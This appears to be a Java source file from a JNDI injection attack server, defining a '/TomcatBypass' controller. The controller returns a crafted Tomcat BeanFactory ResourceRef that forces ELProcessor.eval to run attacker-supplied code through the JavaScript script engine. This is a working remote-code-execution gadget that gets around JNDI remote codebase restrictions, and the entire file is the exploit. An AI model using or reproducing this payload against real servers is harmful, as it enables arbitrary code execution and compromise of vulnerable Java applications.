package cn.butler.jndi.controller.bypass;

import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.controller.BasicController;
import cn.butler.thirdparty.payloads.expression.JSExpression;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/TomcatBypass")
public class TomcatBypassController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        String code = JSExpression.commonExpressModify(byteCode);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"" + code + "\")"));
        return ref;
    }
}
